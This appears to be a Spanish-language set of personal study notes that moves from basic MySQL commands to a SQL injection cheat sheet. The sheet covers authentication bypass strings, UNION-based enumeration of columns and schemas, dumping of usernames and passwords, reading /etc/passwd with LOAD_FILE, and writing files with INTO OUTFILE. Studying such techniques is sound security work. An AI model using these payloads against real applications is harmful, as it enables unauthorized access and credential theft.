# Sintaxis de SQL
mysql -u root  -h HOST -P PORT -p

Crear DB:
CREATE DATABASE users;

Mostrar DBs:
SHOW DATABASES;

Usar una DB:
USE users;

Mostrar tablas:
SHOW TABLES;

DESCRIBE tabla;

Añadir datos:
INSERT INTO tabla VALUES(columna1, columna2,...);

Leer datos:
SELECT * FROM tabla;
					ORDER BY campo ASC|DESC;
					LIMIT 2; # los 2 primeros
					WHERE condicion AND condicion; # && 
					WHERE condicion OR condicion; # ||
					WHERE username LIKE 'admin%';
					UNION SELECT * FROM otratabla; # tiene que tener el mismo número de columnas
					
					
					

Borrar cosas:
DROP TABLE tabla;

Para tocar cosas dentro de tablas:
ALTER TABLE tabla ADD nuevacolumna INT;
				RENAME COLUMN antiguo TO nuevo;
				MODIFY columna DATE;
				DROP columna;
				




# Inyecciones

## Bypass auth
| Payload | URL Encoded |
| ------- | ----------- |
| `'`     | `%27`       |
| `"`     | `%22`       |
| `#`     | `%23`       |
| `;`     | `%3B`       |
| `)`     | `%29`       |

Por ejemplo:
```sql
admin' or '1'='1

admin'-- # COMENTARIO
```


Para poder leer cosas con UNION con distinto número de columnas, podemos añadir datos basura:
```sql
UNION SELECT username, 2, 3, 4 from passwords-- '
``` 

Tienen que mantener el mismo tipo de dato que la columna que estamos intentando leer. Para inyecciones más avanzadas, puede ser útil usar NULL, que le va a todos los tipos de datos

## Saber cuantas columnas tiene lo que vamos a explotar
Se puede usar la orden "order by" para saber cuantas columnas tiene.
```sql
' order by 2
```
habrá que probar números hasta que uno devuelva un error. # siempre funciona hasta encontrar un error

También se puede usar union para esto:
```sql
UNION select 1,2,3
```
Este siempre devuelve error hasta que aciertas el número de columnas
esto tiene varias aplicaciones, como por ejemplo, usar @@version, user()...

## Fingerprinting

```sql
SELECT * FROM my_database.users;

SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

```sql
' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='nombredb'-- -
```
Esto nos devuelve las tablas q hay

```sql
' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```
Esto nos devuelve las columnas que hay en la tabla

```sql
' UNION select 1, username, password, 4 from db.tabla-- -
```
Esto nos devuelve ya la información de las columnas


### Obtener información del sistema

```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```

```sql
SELECT super_priv FROM mysql.user 
``` 
(privilegios)
se le puede añadir WHERE user="nuestrouser"

para ver los perms específicos:
```sql
' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
```


Teniendo estos permisos, podemos intentar leer archivos de sistema

```sql
SELECT LOAD_FILE('/etc/passwd');
```

con un paylad en union también funciona como he puesto antes


### Escribir archivos
```sql
SHOW VARIABLES LIKE 'secure_file_priv';
```
Esta variable nos dice donde podemos escribir/leer. Si está vacía tenemos acceso al sistema entero, si no, solo al especificado.

```sql
SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
```

```sql
SELECT * from users INTO OUTFILE '/tmp/credentials';
```
El INTO OUTFILE nos permite exportar la información
Para pasarle cadenas más largas podemos usar FROM_BASE64("base64_data")
